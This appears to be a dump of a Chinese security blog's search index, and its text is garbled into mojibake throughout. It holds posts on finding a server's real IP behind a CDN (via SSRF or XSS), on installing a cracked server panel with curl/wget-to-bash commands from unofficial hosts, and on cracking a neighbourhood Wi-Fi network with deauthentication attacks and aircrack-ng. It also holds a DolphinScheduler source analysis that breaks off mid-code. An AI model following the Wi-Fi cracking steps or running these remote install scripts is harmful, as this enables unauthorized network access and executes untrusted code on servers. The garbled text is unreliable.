å¦‚æœç½‘ç«™æœ‰ç¼–è¾‘å™¨å¯ä»¥å¡«å†™è¿œç¨‹urlå›¾ç‰‡ï¼Œå³å¯è·å–çœŸå®IP å¦‚æœå­˜åœ¨ssrfæ¼æ´ æˆ–è€…xss è®©æœåŠ¡å™¨ä¸»åŠ¨è¿æ¥æˆ‘ä»¬çš„æœåŠ¡å™¨ å‡å¯è·å–çœŸå®IPã€‚ 3.19. æ‰«å…¨ç½‘è·å–çœŸå®IPhttps://github.com/superfish9/hackcdn https://github.com/boy-hack/w8fuckcdn","categories":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"http://blog.ioimp.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"ç½‘å®‰","slug":"ç½‘å®‰","permalink":"http://blog.ioimp.top/tags/%E7%BD%91%E5%AE%89/"},{"name":"æ¸—é€å¿…çŸ¥å¿…ä¼š","slug":"æ¸—é€å¿…çŸ¥å¿…ä¼š","permalink":"http://blog.ioimp.top/tags/%E6%B8%97%E9%80%8F%E5%BF%85%E7%9F%A5%E5%BF%85%E4%BC%9A/"}]},{"title":"å®å¡”é¢æ¿ä¼ä¸šç‰ˆ","slug":"å®å¡”é¢æ¿ä¼ä¸šç‰ˆ","date":"2023-08-07T05:44:37.000Z","updated":"2023-08-07T05:49:16.217Z","comments":true,"path":"2023/08/07/å®å¡”é¢æ¿ä¼ä¸šç‰ˆ/","link":"","permalink":"http://blog.ioimp.top/2023/08/07/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF%E4%BC%81%E4%B8%9A%E7%89%88/","excerpt":"","text":"ä»å¤–éƒ¨å¼•å…¥è„šæœ¬ æµ‹è¯•å¯ç”¨ è‡ªè¡Œè¾¨åˆ«å®‰å…¨ å®‰è£…è„šæœ¬å’Œå‡çº§è„šæœ¬è‡ªå·±çœ‹å®é™…æƒ…å†µä½¿ç”¨ å®å¡”ä¼ä¸šç‰ˆä»‹ç» Â· å®‰å…¨ï¼šå‰¥ç¦»äº†æ‰€æœ‰ä¸å®å¡”å®˜æ–¹çš„é€šä¿¡ã€ä¸ŠæŠ¥ã€ä¸‹å‘ï¼›å¹¶ä¸”ä¸ä¸æœ¬ç«™ä¼ä¸šç‰ˆæœåŠ¡å™¨é€šä¿¡ï¼› Â· å…è´¹ï¼šæå‡ä¸ºä¼ä¸šä¼šå‘˜ï¼Œå…è´¹ä½¿ç”¨è½¯ä»¶å•†åº—ä¸­çš„æ‰€æœ‰[ä¼ä¸šç‰ˆæ’ä»¶]ã€[ä¸“ä¸šç‰ˆæ’ä»¶]ã€[è¿è¡Œç¯å¢ƒ]ã€[å…è´¹æ’ä»¶]ã€[å®å¡”æ’ä»¶]ï¼›éƒ¨åˆ†[ç¬¬ä¸‰æ–¹åº”ç”¨]å®‰è£…å¯èƒ½ä¼šå¤±è´¥ï¼› Â· è§£å†³æ–¹æ¡ˆï¼šæ‰€æœ‰åŠŸèƒ½ä¸åŸç‰ˆä¸€è‡´ï¼Œå¦‚æœ‰ä»»ä½•é—®é¢˜è¯·å‚è€ƒå®å¡”å®˜æ–¹è§£å†³æ–¹æ¡ˆï¼›æˆ–å‰å¾€äº¤æµç¾¤äº¤æµï¼ Â· é¢æ¿ä¿®å¤ï¼šä¼ä¸šç‰ˆä¸ä¸å®˜æ–¹é€šä¿¡ï¼Œä¹Ÿæ²¡æœ‰ä¸æˆ‘ä»¬æœåŠ¡å™¨é€šä¿¡ï¼Œæ‰€ä»¥æ— æ³•åˆ¤æ–­è´µç«™æƒ…å†µï¼Œå»ºè®®ä½¿ç”¨å‡çº§ä»£ç ä¿®å¤&#x2F;æˆ–å®‰è£…å®å¡”å®˜æ–¹ç‰ˆå†å®‰è£…ä¼ä¸šç‰ˆ(å°æ¦‚ç‡å‡ºç°å¼‚å¸¸ï¼Œå¤§æ¦‚ç‡åªé‡è£…é¢æ¿ä¸å½±å“ç½‘ç«™è¿è¡Œ)ï¼› Â· å…¶ä»–æç¤ºï¼šå¦‚æœå‘ç°[è½¯ä»¶å•†åº—]ç©ºç™½ï¼Œå¤§å¤šæ˜¯æœåŠ¡å™¨ä¸ä½ æœ¬åœ°çš„ç½‘ç»œé—®é¢˜ï¼Œè¯·æ¸…ç†æœ¬åœ°ç¼“å­˜&#x2F;åˆ‡æ¢æµè§ˆå™¨çš„è®¿å®¢æ¨¡å¼è®¿é—®&#x2F;åˆ‡æ¢æœ¬åœ°ä»£ç†IPï¼› Â· æœ¬ç«™å£°æ˜ï¼šä¼ä¸šç‰ˆåŸºäºå®˜æ–¹ä»£ç ã€ä»…åšé€šä¿¡å‰¥ç¦»ã€ä»£ç æœªåŠ å¯†ã€æœªæ·»åŠ ä»»ä½•æ–°å¢ä»£ç ï¼ å®å¡”ä¼ä¸šç‰ˆé¢æ¿ï¼šæ–°ç¯å¢ƒæ–°æœåŠ¡å™¨ï¼ˆä¹Ÿæ˜¯å°±ä»€ä¹ˆéƒ½æ²¡è£…çš„ä½¿ç”¨ä¸‹é¢å‘½ä»¤å®‰è£…ï¼‰å·²å®‰è£…æœ‹å‹è¯·ç›´æ¥è·³è¿‡å¾€ä¸‹çœ‹ï¼ å®˜æ–¹æœ€æ–°ç‰ˆ7.9ç‰ˆæœ¬ï¼Œå®‰è£…è„šæœ¬ï¼ˆæ¥æºå®å¡”å®˜æ–¹ï¼‰ï¼š æ•™ç¨‹ç¯å¢ƒä½¿ç”¨çš„æ˜¯CentOS 7.9 å®‰è£…å‘½ä»¤ï¼š1234567891011121314151617181920212223242526272829Centoså®‰è£…å‘½ä»¤ï¼ˆé»˜è®¤å®‰è£…æ˜¯7.8.0 ç›´æ¥åœ¨çº¿å‡çº§7.9.3ï¼‰ï¼šä¸»èŠ‚ç‚¹ï¼šyum install -y wget &amp;&amp; wget -O install.sh http://io.bt.sy/install/install_6.0.sh &amp;&amp; sh install.sh æµ·å¤–èŠ‚ç‚¹ä¸“ç”¨ï¼šyum install -y wget &amp;&amp; wget -O install.sh http://io.yu.al/install/install_6.0.sh &amp;&amp; sh install.sh è¯•éªŒæ€§Centos/Ubuntu/Debianå®‰è£…å‘½ä»¤ ç‹¬ç«‹è¿è¡Œç¯å¢ƒï¼ˆpy3.7ï¼‰ å¯èƒ½å­˜åœ¨å°‘é‡å…¼å®¹æ€§é—®é¢˜ ä¸æ–­ä¼˜åŒ–ä¸­ä¸»èŠ‚ç‚¹ï¼šcurl -sSO http://io.bt.sy/install/install_panel.sh &amp;&amp; bash install_panel.sh æµ·å¤–èŠ‚ç‚¹ä¸“ç”¨ï¼šcurl -sSO http://io.yu.al/install/install_panel.sh &amp;&amp; bash install_panel.sh Ubuntu Deepinå®‰è£…å‘½ä»¤ï¼šä¸»èŠ‚ç‚¹ï¼šwget -O install.sh http://io.bt.sy/install/install-ubuntu_6.0.sh &amp;&amp; sudo bash install.sh æµ·å¤–èŠ‚ç‚¹ä¸“ç”¨ï¼šwget -O install.sh http://io.yu.al/install/install-ubuntu_6.0.sh &amp;&amp; sudo bash install.sh Debianå®‰è£…å‘½ä»¤ï¼šä¸»èŠ‚ç‚¹ï¼šwget -O install.sh http://io.bt.sy/install/install-ubuntu_6.0.sh &amp;&amp; bash install.sh æµ·å¤–èŠ‚ç‚¹ä¸“ç”¨ï¼šwget -O install.sh http://io.yu.al/install/install-ubuntu_6.0.sh &amp;&amp; bash install.sh Fedoraå®‰è£…å‘½ä»¤:ä¸»èŠ‚ç‚¹ï¼šwget -O install.sh http://io.bt.sy/install/install_6.0.sh &amp;&amp; bash install.sh æµ·å¤–èŠ‚ç‚¹ä¸“ç”¨ï¼šwget -O install.sh http://io.yu.al/install/install_6.0.sh &amp;&amp; bash install.sh[/van-wechat-hide] å‡çº§æ•™ç¨‹ï¼š1.é¦–å…ˆå‡çº§åˆ°å®˜æ–¹æœ€æ–°ç‰ˆ7.9ç‰ˆæœ¬ï¼Œå‡çº§è„šæœ¬ï¼ˆæ¥æºå®å¡”å®˜æ–¹ï¼‰ï¼š 1curl https://download.bt.cn/install/update_panel.sh|bash å‡çº§å‘½ä»¤1 Linuxé¢æ¿ 7.9.3 å‡çº§ä¼ä¸šç‰ˆå‘½ä»¤ 1ï¼ˆ7.9.3 å®˜æ–¹ç‰ˆ &#x2F; 7.7.0 å¼€å¿ƒç‰ˆ å¯ä»¥æ‰§è¡Œè¿™ä¸ªå‡çº§åˆ° 7.9.3 å¼€å¿ƒç‰ˆï¼‰ï¼š 123456789101112131415161718ä¸»èŠ‚ç‚¹ï¼šcurl https://io.bt.sy/install/update_panel.sh|bashæµ·å¤–èŠ‚ç‚¹ä¸“ç”¨ï¼šcurl https://io.yu.al/install/update_panel.sh|bashå‡çº§å‘½ä»¤2Linuxé¢æ¿ 7.9.3 å‡çº§ä¼ä¸šç‰ˆå‘½ä»¤ 2ï¼ˆ7.9.3 å®˜æ–¹ç‰ˆ / 7.7.0 å¼€å¿ƒç‰ˆ å¯ä»¥æ‰§è¡Œè¿™ä¸ªå‡çº§åˆ° 7.9.3 å¼€å¿ƒç‰ˆï¼‰ï¼šä¸»èŠ‚ç‚¹ï¼šcurl http://io.bt.sy/install/update6.sh|bashæµ·å¤–èŠ‚ç‚¹ä¸“ç”¨ï¼šcurl http://io.yu.al/install/update6.sh|bash[/van-wechat-hide]ä»¥ä¸Šå‡çº§å‘½ä»¤éƒ½å¯ä»¥å‡çº§æœ€æ–°ç‰ˆï¼ è‡³æ­¤å®‰è£…å®Œæˆï¼Œæˆ‘ä»¬è¿›å…¥å®å¡”é¢æ¿ï¼ŒæŒ‰ä½Ctrl+f5åˆ·æ–°ï¼Œå¤šåˆ·æ–°å‡ æ¬¡æˆ–ç­‰å¾…ä¸€ä¸¤åˆ†é’Ÿå³å¯ã€‚ 7.9.0å¼€å¿ƒç‰ˆæ›´æ–°è®°å½•ï¼šç³»ç»Ÿå·¥å…·ï¼šæ—¥å¿—æ¸…ç†å·¥å…·å¢åŠ 2.0ç‰ˆæœ¬ï¼ å®å¡”æ’ä»¶ï¼šå ¡å¡”ç½‘ç«™åŠ é€Ÿå¢åŠ 4.2ç‰ˆæœ¬ï¼ ä¸“ä¸šç‰ˆæ’ä»¶ï¼šç½‘ç«™ç›‘æ§æŠ¥è¡¨å¢åŠ 6.8ç‰ˆæœ¬ï¼ ä¼ä¸šç‰ˆæ’ä»¶ï¼šå ¡å¡”é˜²ææƒæ”¹åå ¡å¡”é˜²å…¥ä¾µï¼ ä¼ä¸šç‰ˆæ’ä»¶ï¼šå ¡å¡”é™åˆ¶è®¿é—®å‹è¯ä¹¦-Linuxç‰ˆå¢åŠ 1.2ç‰ˆæœ¬ï¼ ç¬¬ä¸‰æ–¹æ’ä»¶ï¼šNginxå…è´¹é˜²ç«å¢™æ›´æ–°6.3ç‰ˆæœ¬ï¼ ç¬¬ä¸‰æ–¹æ’ä»¶ï¼šç™¾åº¦ç½‘ç›˜æ›´æ–°3.9ç‰ˆæœ¬ï¼ éƒ¨åˆ†ç¬¬ä¸‰æ–¹æ’ä»¶å·²ç»å…¨éƒ¨æ›´æ–°åŒæ­¥å®˜æ–¹ï¼ ä¿®å¤ç¬¬ä¸‰æ–¹æ’ä»¶ç™¾åº¦ç½‘ç›˜æ— æ³•ä½¿ç”¨é—®é¢˜ï¼ ä¿®å¤å·²çŸ¥é“çš„ä¸€äº›æ’ä»¶åˆ°æœŸçš„é—®é¢˜ï¼ ä¿®å¤ç¬¬ä¸€æ¬¡å®‰è£…è„šæœ¬ï¼Œéœ€è¦é€€å‡ºç™»å½•é‡ç™»æ‰èƒ½å®‰è£…æ’ä»¶çš„é€»è¾‘é—®é¢˜ï¼ ä¿®å¤éƒ¨åˆ†ç”¨æˆ·ç™»å½•è™šæ‹Ÿè´¦æˆ·æ— æ³•è·å–åˆ—è¡¨authlistç©ºç™½çš„é—®é¢˜ï¼ ä¿®å¤å±é™©çº§åˆ«ï¼šç‰¹é«˜å»é™¤å®å¡”å› ä¸ºè´¦æˆ·è·Ÿå®å¡”ä¸åŒ¹é…å°banç”¨æˆ·ipé£é™©çš„é—®é¢˜ï¼ˆå¯¼è‡´æ¢å¤å…è´¹ç‰ˆä¹Ÿæ— æ³•ä½¿ç”¨ï¼Œåªèƒ½é™çº§7.7.0æ‰èƒ½ä½¿ç”¨ï¼‰ï¼ å·²æ”¯æŒArmæ„æ¶ï¼ï¼ï¼","categories":[{"name":"ç½‘ç«™æ­å»º","slug":"ç½‘ç«™æ­å»º","permalink":"http://blog.ioimp.top/categories/%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/"}],"tags":[{"name":"å®å¡”é¢æ¿","slug":"å®å¡”é¢æ¿","permalink":"http://blog.ioimp.top/tags/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF/"}]},{"title":"è®°ä¸€æ¬¡å¯¹å°åŒºwifiæ¸—é€","slug":"my-first-blog","date":"2023-08-03T13:43:26.000Z","updated":"2023-08-03T13:49:56.399Z","comments":true,"path":"2023/08/03/my-first-blog/","link":"","permalink":"http://blog.ioimp.top/2023/08/03/my-first-blog/","excerpt":"","text":"wifiæ¸—é€(ä¸€)ç¬¬ä¸‰æ­¥â€”â€”æ£€æŸ¥å¹¶å¼€å¯ç½‘å¡çš„ç›‘å¬åŠŸèƒ½airmon-ngï¼šæ£€æŸ¥ç½‘å¡æ˜¯å¦æ”¯æŒç›‘å¬åŠŸèƒ½çš„ airmon-ng start wlan0mon ï¼šæ¿€æ´»æ— çº¿ç½‘å¡çš„ç›‘å¬æ¨¡å¼ ç¬¬å››æ­¥â€”â€”æ‰«æå‘¨è¾¹wifiä¿¡å·airodump-ng wlan0mon ï¼šæ‰«æå½“å‰å‘¨è¾¹ç¯å¢ƒçš„WiFiä¿¡å· æ³¨æ„ï¼šæ‰¾åˆ°ä½ è¦ç ´è§£çš„wifiä¿¡æ¯ï¼Œè®°ä½å®ƒçš„BSSIDå’ŒCH,åé¢è¦ç”¨ï¼ ç¬¬äº”æ­¥â€”â€”æŠ“åŒ…ä¸‹é¢é‡Œçš„éƒ¨åˆ†ä¿¡æ¯æ ¹æ®è‡ªå·±çš„æƒ…å†µè¿›è¡Œæ›¿æ¢ æŠ“åŒ…å‘½ä»¤ï¼šairodump-ng -c &#x3D;&#x3D;CHå·ç &#x3D;&#x3D; â€“bssid &#x3D;&#x3D;BSSIDå·ç &#x3D;&#x3D; -w &#x2F;home&#x2F;kali&#x2F;æ¡Œé¢&#x2F;handshake wlan0mon æ³¨æ„ï¼š 1-wåæ¥æŠ“åŒ…åå¾—åˆ°çš„æ–‡ä»¶ä¿å­˜è·¯å¾„å’Œåç§°ï¼Œæ³¨æ„è·¯å¾„ï¼ æˆ‘çš„ç”¨æˆ·åæ˜¯kaliï¼Œä½ çš„å¡«ä½ è‡ªå·±çš„ æ³¨ï¼šè¿™ç§æ–¹å¼æ˜¯ä¸€ç§è¢«åŠ¨ç­‰å¾…çš„æ–¹å¼ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å°†é“¾æ¥åœ¨è¯¥wifiä¸Šçš„è®¾å¤‡è¸¢ä¸‹çº¿ï¼Œä»¥ä¾¿æˆ‘ä»¬å¿«é€ŸæŠ“åŒ…ã€‚ è¿™é‡Œæˆ‘ä»¬éœ€è¦è®°ä¸‹BSSID(WIFIè·¯ç”±åœ°å€)å’ŒSTATIONï¼ˆé“¾æ¥è®¾å¤‡å·ï¼‰ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°†è¯¥è®¾å¤‡ä»è¯¥wifié“¾æ¥çŠ¶æ€ä¸‹å¼ºåˆ¶è¸¢ä¸‹çº¿ ç¬¬å…­æ­¥â€”â€”æ‰“æ‰è¿æ¥ACK æ­»äº¡æ”»å‡»ï¼šaireplay-ng -0 10 -a BSSIDå· -c STATIONå· wlan0mon 110â€”â€”æ˜¯æ”»å‡»æ¬¡æ•°ï¼Œä¸€èˆ¬10æ¬¡å°±è¶³å¤Ÿæˆ‘ä»¬æŠ“åˆ°åŒ…äº†ï¼Œå¦‚æœå°†æ¬¡æ•°è°ƒæ•´çš„å¾ˆå¤§ï¼Œé‚£ä¹ˆå°±ä¼šæŒç»­çš„è¿›è¡Œæ”»å‡»ï¼Œå¯¼è‡´è¯¥è®¾å¤‡é•¿æœŸæ— æ³•é“¾æ¥åˆ°è¯¥wifi! æ³¨ï¼šè¿™æ ·åšå°†ä¼šå¯¼è‡´è¿æ¥åœ¨è¯¥wifiä¸Šçš„è®¾å¤‡è¢«å¼ºåˆ¶ä¸‹çº¿ï¼Œç„¶åå› ä¸ºwifiçš„è‡ªåŠ¨é‡è¿æœºåˆ¶ï¼Œä½¿å¾—æˆ‘ä»¬å¯ä»¥å¿«é€ŸæŠ“åˆ°åŒ…ã€‚ æœ€åä¸€æ­¥â€”â€”ç ´è§£ç ´è§£è¯­æ³•ï¼šaircrack-ng -w &lt;æŒ‡å®šå­—å…¸&gt; -b &lt;ç›®çš„è·¯ç”±MACåœ°å€&gt; &lt;æŠ“åˆ°çš„æ¡æ‰‹åŒ…&gt; æ³¨ï¼šç›®çš„è·¯ç”±MACåœ°å€â€”â€”å°±æ˜¯BSSID æŠ“åˆ°çš„æ¡æ‰‹åŒ…â€”â€”capæ–‡ä»¶ kaliè‡ªå¸¦å­—å…¸ï¼šaircrack-ng -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -b 78:72:5D:E0:BC:37 &#x2F;home&#x2F;kali&#x2F;æ¡Œé¢&#x2F;handshake-0*.cap éœ€è¦å…ˆè§£å‹ï¼šgzip -d &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt.gz è‡ªæˆ‘æŒ‡å®šå­—å…¸ï¼šaircrack-ng -w &#x2F;home&#x2F;kali&#x2F;password.txt -b 78:72:5D:E0:BC:37 &#x2F;home&#x2F;kali&#x2F;æ¡Œé¢&#x2F;handshake-0*.cap æˆåŠŸï¼ ç ´è§£çš„wifiå¯†ç å°±ä¸ºa123456789","categories":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"http://blog.ioimp.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"ç½‘å®‰","slug":"ç½‘å®‰","permalink":"http://blog.ioimp.top/tags/%E7%BD%91%E5%AE%89/"}]},{"title":"ä¸€æ¬¡å¯¹dolphinschedulerçš„æºç åˆ†æ","slug":"ä¸€æ¬¡å¯¹dolphinschedulerçš„æºç åˆ†æ","date":"2023-07-20T01:05:10.000Z","updated":"2023-08-04T01:42:34.318Z","comments":true,"path":"2023/07/20/ä¸€æ¬¡å¯¹dolphinschedulerçš„æºç åˆ†æ/","link":"","permalink":"http://blog.ioimp.top/2023/07/20/%E4%B8%80%E6%AC%A1%E5%AF%B9dolphinscheduler%E7%9A%84%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/","excerpt":"","text":"dolphinschedulerå­¦ä¹ DolphinScheduler é¡¹ç›®ç»“æ„2.1 ç»“æ„åˆ†æ å¯¼å…¥é¡¹ç›®åï¼Œå¯ä»¥çœ‹åˆ°å…¶ä¸»è¦æ ¸å¿ƒæ¨¡å—å¦‚ä¸‹ï¼š æ¨¡å— æè¿° dolphinscheduler-alert å‘Šè­¦æ¨¡å—ï¼Œæä¾› AlertServer æœåŠ¡ã€‚ dolphinscheduler-api webåº”ç”¨æ¨¡å—ï¼Œæä¾› ApiServer æœåŠ¡ã€‚ dolphinscheduler-common é€šç”¨çš„å¸¸é‡æšä¸¾ã€å·¥å…·ç±»ã€æ•°æ®ç»“æ„æˆ–è€…åŸºç±» dolphinscheduler-dao æä¾›æ•°æ®åº“è®¿é—®ç­‰æ“ä½œã€‚ dolphinscheduler-remote åŸºäº netty çš„å®¢æˆ·ç«¯ã€æœåŠ¡ç«¯ dolphinscheduler-server MasterServer å’Œ WorkerServer æœåŠ¡ dolphinscheduler-service serviceæ¨¡å—ï¼ŒåŒ…å«Quartzã€Zookeeperã€æ—¥å¿—å®¢æˆ·ç«¯è®¿é—®æœåŠ¡ï¼Œä¾¿äºserveræ¨¡å—å’Œapiæ¨¡å—è°ƒç”¨ dolphinscheduler-ui å‰ç«¯æ¨¡å— 2.2 è¡¨åˆ†æ dolphinscheduler_ddl.sqlåŠdolphinscheduler_dml.sql æ‰§è¡Œå®Œåï¼Œå¯ä»¥åœ¨æ•°æ®åº“é‡Œçœ‹åˆ°æœ‰å¦‚ä¸‹è¡¨ï¼š è¡¨å è¡¨ä¿¡æ¯ t_ds_access_token è®¿é—®dsåç«¯çš„token t_ds_alert å‘Šè­¦ä¿¡æ¯ t_ds_alertgroup å‘Šè­¦ç»„ t_ds_command æ‰§è¡Œå‘½ä»¤ t_ds_datasource æ•°æ®æº t_ds_error_commandï¼ˆæ ¸å¿ƒè¡¨ï¼‰ é”™è¯¯å‘½ä»¤ t_ds_process_definitionï¼ˆæ ¸å¿ƒè¡¨ï¼‰ æµç¨‹å®šä¹‰ t_ds_process_instanceï¼ˆæ ¸å¿ƒè¡¨ï¼‰ æµç¨‹å®ä¾‹ t_ds_project é¡¹ç›® t_ds_queue é˜Ÿåˆ— t_ds_relation_datasource_user ç”¨æˆ·å…³è”æ•°æ®æº t_ds_relation_process_instance å­æµç¨‹ t_ds_relation_project_user ç”¨æˆ·å…³è”é¡¹ç›® t_ds_relation_resources_user ç”¨æˆ·å…³è”èµ„æº t_ds_relation_udfs_user ç”¨æˆ·å…³è”UDFå‡½æ•° t_ds_relation_user_alertgroup ç”¨æˆ·å…³è”å‘Šè­¦ç»„ t_ds_resources èµ„æºæ–‡ä»¶ t_ds_schedulesï¼ˆæ ¸å¿ƒè¡¨ï¼‰ æµç¨‹å®šæ—¶è°ƒåº¦ t_ds_session ç”¨æˆ·ç™»å½•çš„session t_ds_task_instanceï¼ˆæ ¸å¿ƒè¡¨ï¼‰ ä»»åŠ¡å®ä¾‹ t_ds_tenant ç§Ÿæˆ· t_ds_udfs UDFèµ„æº t_ds_user ç”¨æˆ· t_ds_version dsç‰ˆæœ¬ä¿¡æ¯ 2.2.1 ç±»å…³ç³»å›¾ ï¼ˆç”¨æˆ·&#x2F;é˜Ÿåˆ—&#x2F;æ•°æ®æºï¼‰ DS æè¿°å¦‚ä¸‹ï¼š ä¸€ä¸ªç§Ÿæˆ·ä¸‹å¯ä»¥æœ‰å¤šä¸ªç”¨æˆ·ï¼› t_ds_userä¸­çš„queueå­—æ®µå­˜å‚¨çš„æ˜¯é˜Ÿåˆ—è¡¨ä¸­çš„queue_nameä¿¡æ¯; t_ds_tenantä¸‹å­˜çš„æ˜¯queue_idï¼Œåœ¨æµç¨‹å®šä¹‰æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œç”¨æˆ·é˜Ÿåˆ—ä¼˜å…ˆçº§æœ€é«˜ï¼Œç”¨æˆ·é˜Ÿåˆ—ä¸ºç©ºåˆ™é‡‡ç”¨ç§Ÿæˆ·é˜Ÿåˆ—ï¼› t_ds_datasourceè¡¨ä¸­çš„user_idå­—æ®µè¡¨ç¤ºåˆ›å»ºè¯¥æ•°æ®æºçš„ç”¨æˆ·; t_ds_relation_datasource_userä¸­çš„user_idè¡¨ç¤ºï¼Œå¯¹æ•°æ®æºæœ‰æƒé™çš„ç”¨æˆ·ã€‚ 2.2.2 ç±»å…³ç³»å›¾ ï¼ˆé¡¹ç›®&#x2F;èµ„æº&#x2F;å‘Šè­¦ï¼‰ DS æè¿°å¦‚ä¸‹ï¼š ä¸€ä¸ªç”¨æˆ·å¯ä»¥æœ‰å¤šä¸ªé¡¹ç›®ï¼Œç”¨æˆ·é¡¹ç›®æˆæƒé€šè¿‡t_ds_relation_project_userè¡¨å®Œæˆproject_idå’Œuser_idçš„å…³ç³»ç»‘å®šï¼› t_ds_projcetè¡¨ä¸­çš„user_idè¡¨ç¤ºåˆ›å»ºè¯¥é¡¹ç›®çš„ç”¨æˆ·ï¼› t_ds_relation_project_userè¡¨ä¸­çš„user_idè¡¨ç¤ºå¯¹é¡¹ç›®æœ‰æƒé™çš„ç”¨æˆ·ï¼› t_ds_resourcesè¡¨ä¸­çš„user_idè¡¨ç¤ºåˆ›å»ºè¯¥èµ„æºçš„ç”¨æˆ·ï¼› t_ds_relation_resources_userä¸­çš„user_idè¡¨ç¤ºå¯¹èµ„æºæœ‰æƒé™çš„ç”¨æˆ·ï¼› t_ds_udfsè¡¨ä¸­çš„user_idè¡¨ç¤ºåˆ›å»ºè¯¥UDFçš„ç”¨æˆ·ï¼› t_ds_relation_udfs_userè¡¨ä¸­çš„user_idè¡¨ç¤ºå¯¹UDFæœ‰æƒé™çš„ç”¨æˆ·ã€‚ 2.2.3 ç±»å…³ç³»å›¾ ï¼ˆ å‘½ä»¤&#x2F;æµç¨‹&#x2F;ä»»åŠ¡ï¼‰ DS æè¿°å¦‚ä¸‹ï¼š ä¸€ä¸ªé¡¹ç›®æœ‰å¤šä¸ªæµç¨‹å®šä¹‰ï¼Œä¸€ä¸ªæµç¨‹å®šä¹‰å¯ä»¥ç”Ÿæˆå¤šä¸ªæµç¨‹å®ä¾‹ï¼Œä¸€ä¸ªæµç¨‹å®ä¾‹å¯ä»¥ç”Ÿæˆå¤šä¸ªä»»åŠ¡å®ä¾‹ï¼› t_ds_schedulersè¡¨å­˜æ”¾æµç¨‹å®šä¹‰çš„å®šæ—¶è°ƒåº¦ä¿¡æ¯ï¼› t_ds_relation_process_instanceè¡¨å­˜æ”¾çš„æ•°æ®ç”¨äºå¤„ç†æµç¨‹å®šä¹‰ä¸­å«æœ‰å­æµç¨‹çš„æƒ…å†µï¼Œparent_process_instance_idè¡¨ç¤ºå«æœ‰å­æµç¨‹çš„ä¸»æµç¨‹å®ä¾‹idï¼Œprocess_instance_idè¡¨ç¤ºå­æµç¨‹å®ä¾‹çš„idï¼Œparent_task_instance_idè¡¨ç¤ºå­æµç¨‹èŠ‚ç‚¹çš„ä»»åŠ¡å®ä¾‹idï¼Œæµç¨‹å®ä¾‹è¡¨å’Œä»»åŠ¡å®ä¾‹è¡¨åˆ†åˆ«å¯¹åº”t_ds_process_instanceè¡¨å’Œt_ds_task_instanceè¡¨ 03 DolphinScheduler æºç åˆ†æ è®²è§£æºç å‰ï¼Œå…ˆè´´ä¸€ä»½å®˜ç½‘çš„å¯åŠ¨æµç¨‹å›¾ï¼š 3.1 ExecutorController DS org.apache.dolphinscheduler.api.controller.ExecutorController ä»¥ä¸‹æ˜¯å¯¹å„æ¥å£çš„æè¿°ï¼š æ¥å£ æè¿° &#x2F;start-process-instance æ‰§è¡Œæµç¨‹å®ä¾‹ &#x2F;batch-start-process-instance æ‰¹é‡æ‰§è¡Œæµç¨‹å®ä¾‹ &#x2F;execute æ“ä½œæµç¨‹å®ä¾‹ï¼Œå¦‚ï¼šæš‚åœ, åœæ­¢, é‡è·‘, ä»æš‚åœæ¢å¤,ä»åœæ­¢æ¢å¤ &#x2F;batch-execute æ‰¹é‡æ“ä½œæµç¨‹å®ä¾‹ &#x2F;start-check æ£€æŸ¥æµç¨‹å®šä¹‰æˆ–æ£€æŸ¥æ‰€æœ‰çš„å­æµç¨‹å®šä¹‰æ˜¯å¦åœ¨çº¿ æ¥ä¸‹æˆ‘ä»¬çœ‹çœ‹æœ€æ ¸å¿ƒçš„æ–¹æ³•ï¼š 123456789101112131415161718192021222324252627/** * do action to process instance: pause, stop, repeat, recover from pause, recover from stop * * @param loginUser login user * @param projectCode project code * @param processInstanceId process instance id * @param executeType execute type * @return execute result code */ @ApiOperation(value = &quot;execute&quot;, notes = &quot;EXECUTE_ACTION_TO_PROCESS_INSTANCE_NOTES&quot;) @ApiImplicitParams(&#123; @ApiImplicitParam(name = &quot;processInstanceId&quot;, value = &quot;PROCESS_INSTANCE_ID&quot;, required = true, dataType = &quot;Int&quot;, example = &quot;100&quot;), @ApiImplicitParam(name = &quot;executeType&quot;, value = &quot;EXECUTE_TYPE&quot;, required = true, dataType = &quot;ExecuteType&quot;) &#125;) @PostMapping(value = &quot;/execute&quot;) @ResponseStatus(HttpStatus.OK) @ApiException(EXECUTE_PROCESS_INSTANCE_ERROR) @AccessLogAnnotation(ignoreRequestArgs = &quot;loginUser&quot;) public Result execute(@ApiIgnore @RequestAttribute(value = Constants.SESSION_USER) User loginUser, @ApiParam(name = &quot;projectCode&quot;, value = &quot;PROJECT_CODE&quot;, required = true) @PathVariable long projectCode, @RequestParam(&quot;processInstanceId&quot;) Integer processInstanceId, @RequestParam(&quot;executeType&quot;) ExecuteType executeType ) &#123; Map result = execService.execute(loginUser, projectCode, processInstanceId, executeType); return returnDataList(result); &#125; å¯ä»¥çœ‹åˆ°executeæ¥å£ï¼Œæ˜¯ç›´æ¥ä½¿ç”¨ExecServiceå»æ‰§è¡Œäº†ï¼Œä¸‹é¢åˆ†æä¸‹ã€‚ 3.2 ExecService DS ä¸‹é¢çœ‹çœ‹é‡Œé¢çš„executeæ–¹æ³•ï¼Œå·²ç»åŠ å¥½äº†æ³¨é‡Šï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103/** * æ“ä½œå·¥ä½œæµå®ä¾‹ * * @param loginUser ç™»å½•ç”¨æˆ· * @param projectCode é¡¹ç›®ç¼–ç  * @param processInstanceId æµç¨‹å®ä¾‹ID * @param executeType æ‰§è¡Œç±»å‹ï¼ˆrepeat runningã€resume pauseã€resume failureã€stopã€pauseï¼‰ * @return æ‰§è¡Œç»“æœ */@Overridepublic Map&lt;String, Object&gt; execute(User loginUser, long projectCode, Integer processInstanceId, ExecuteType 